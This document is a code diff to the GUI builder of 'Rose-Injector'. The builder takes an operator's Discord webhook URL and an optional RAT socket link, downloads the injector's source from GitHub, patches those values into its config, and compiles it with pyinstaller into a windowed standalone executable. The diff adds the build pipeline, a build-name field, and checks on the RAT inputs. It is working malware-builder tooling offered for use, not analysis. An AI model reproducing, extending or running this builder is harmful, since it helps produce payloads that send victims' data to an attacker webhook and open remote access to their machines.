@@ -1,4 +1,10 @@
-# Main GUI for Rose-Injector made by @suegdu
+""" 
+
+NEED TO MAKE THE PING METHOD WORKING ON RUNNABLE 
+@xpierroz 20/03
+"""
+
+# Main GUI for Rose-Injector made by @suegdu and @xpierroz
 # Follow the comments on each, for guiding.
 
 __version__ = 1.0
@@ -15,6 +21,7 @@ try:
     from dhooks import Webhook, Embed
     from PyQt5 import QtCore, QtGui, QtWidgets
     from PyQt5.QtCore import QRunnable, Qt, QThreadPool
+    import os
 except:
     import subprocess
     subprocess.run("python -m pip install requests && python -m pip install beautifulsoup4 && python -m pip install PyQt5 && python -m pip install pypiwin32")
@@ -26,31 +33,79 @@ class Runnable(QRunnable):
         self.n = n
         self.webhook_url = webhook_url
     def run(self):
-            hook = Webhook(self.webhook_url)
-            embed = Embed(
-                description='Webhook is Working',
-                color=11795068,
-                timestamp="now"
-            )
-            embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
-            hook.send(embed=embed)
+        hook = Webhook(self.webhook_url)
+        embed = Embed(
+            description='Webhook is Working',
+            color=11795068,
+            timestamp="now"
+        )
+        embed.set_author(name="Success", icon_url=__icon__)
+        embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
+        hook.send(embed=embed)
+            
 class Runnable_wf(QRunnable):
-    def __init__(self, n):        
+    def __init__(
+        self, n,
+        dir_name,
+        webhook_url,
+        rat_checked,
+        rat_link
+    ):        
         super().__init__()
         self.n = n
-    def run(self):
-       time.sleep(3)
-       try:
+        self.dir_name = dir_name
+        self.webhook_url = webhook_url
+        self.rat_checked = rat_checked
+        self.rat_link = rat_link
+        
+    def create_dir(self):
+        self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
+        os.mkdir(self.path)
+        
+    def make_req(self):
         page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
         soup = BeautifulSoup(page, 'html.parser')
         allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/source/{link.text}" ]
         for file in allFiles:
-           text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
-           with open(f"{Path(__file__).resolve().parent}\\{file}","w",encoding="utf-8") as f:
-               f.write(str(text))
-       except Exception as e:
-           print(e)
+            text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
+            with open(f"{self.path}\\{file}","w",encoding="utf-8") as f:
+                f.write(str(text))
+                
+    def edit_config(self):
+        with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
+            text = f.read()
+            new = text.replace("HOOK", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
+            """text.replace("HOOK", f"{self.webhook_url}")
+            text.replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}")
+            text.replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
+            """
+        print(new)
+        with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
+            f.write(new)
+            
+        dir_list = os.listdir(self.path)
+        
+        for file in dir_list:
+            with open(f"{self.path}\\{file}", "r", encoding="utf-8") as f:
+                text = f.read()
+                new = text.replace("from configuration", f"from config")
+                
+            with open(f"{self.path}\\{file}", "w", encoding="utf-8") as f:
+                f.write(new)
+                
+    def compile(self):
+        os.system(f'pyinstaller --noconfirm --onefile --windowed  "{self.path}/main.py"')
+        
+
+    def run(self):
+        try:
+            print(str(self.rat_checked))
+            self.create_dir()
+            self.make_req()
+            self.edit_config()
+            self.compile()
+        except Exception as e:
+            print(e)
 
 
 class Ui_MainWindow_vailB(object):
@@ -79,6 +134,15 @@ class Ui_MainWindow_vailB(object):
         self.label_2 = QtWidgets.QLabel(self.groupBox_6)
         self.label_2.setGeometry(QtCore.QRect(150, 20, 82, 20))
         self.label_2.setObjectName("label_2")
+        
+        self.dir_name_input = QtWidgets.QLineEdit(self.groupBox_6)
+        self.dir_name_input.setGeometry(QtCore.QRect(230, 42, 181, 20))
+        self.dir_name_input.setObjectName("dir_name_input")
+        
+        self.dir_name = QtWidgets.QLabel(self.groupBox_6)
+        self.dir_name.setGeometry(QtCore.QRect(150, 40, 100, 20))
+        self.dir_name.setObjectName("dir_name")
+        
         self.B_build = QtWidgets.QPushButton(self.groupBox_6)
         self.B_build.setGeometry(QtCore.QRect(20, 20, 111, 31))
         self.B_build.setObjectName("B_build")
@@ -224,6 +288,7 @@ class Ui_MainWindow_vailB(object):
         MainWindow_vailB.setWindowTitle(_translate("MainWindow_vailB", f"Rose Builder {__version__}"))
         self.groupBox_6.setTitle(_translate("MainWindow_vailB", "Control Panel"))
         self.label_2.setText(_translate("MainWindow_vailB", "Webhook URL :"))
+        self.dir_name.setText(_translate("MainWindow_vailB", "Build Name :"))
         self.B_build.setText(_translate("MainWindow_vailB", "Build"))
         self.B_testhook.setText(_translate("MainWindow_vailB", "Test Webhook"))
         self.groupBox_7.setTitle(_translate("MainWindow_vailB", "Console"))
@@ -301,27 +366,42 @@ class Ui_MainWindow_vailB(object):
 
     def writesource(self):
         pool = QThreadPool.globalInstance()
-        runnable = Runnable_wf(1)
+        runnable = Runnable_wf(
+            1,
+            self.dir_name_input.text(),
+            self.LE_webhook_url.text(),
+            self.CB_rat.isChecked(),
+            self.LE_ratsserver.text()
+        )
         pool.start(runnable)
 
 
     def test_hook(self):
-         vfi = "discord.com/api"
-         if str(self.LE_webhook_url.text()) ==str():
-              self.console_write("Error: No URL provided.")
-              return
-         if str(self.LE_webhook_url.text()).isspace():
-              self.console_write("Error: No URL provided.")
-              return
-         if vfi not in str(self.LE_webhook_url.text()) :
+        vfi = "discord.com/api"
+        if str(self.LE_webhook_url.text()) ==str():
+            self.console_write("Error: No URL provided.")
+            return
+        if str(self.LE_webhook_url.text()).isspace():
+            self.console_write("Error: No URL provided.")
+            return
+        if vfi not in str(self.LE_webhook_url.text()) :
                 self.console_write("Error: Invalid webhook URL provided.")
                 return
-         pool = QThreadPool.globalInstance()
-         runnable = Runnable(1, self.LE_webhook_url.text())
-         pool.start(runnable)
+        pool = QThreadPool.globalInstance()
+        runnable = Runnable(1, self.LE_webhook_url.text())
+        pool.start(runnable)
 
     # The main function when the Build button gets pushed.
     def pb_build(self):
+        if str(self.dir_name_input.text()) == str() or str(self.LE_webhook_url.text()).isspace():
+            self.console_write("Error: No build name provided.")
+            return
+        
+        if self.CB_rat.isChecked() is True:
+            if self.LE_ratsserver.text() == str() or str(self.LE_ratsserver.text()).isspace():
+                self.console_write("Error: No RAT URL provided.")
+                return
+        
         self.console_write("\nStarted building....")
         self.prorsmng("start")
         self.console_write("\nRequesting Source....")
@@ -333,11 +413,6 @@ class Ui_MainWindow_vailB(object):
         # function something
         self.prorsmng("stop")
 
-
-
-
-
-    
 
 if __name__ == "__main__":
     import sys
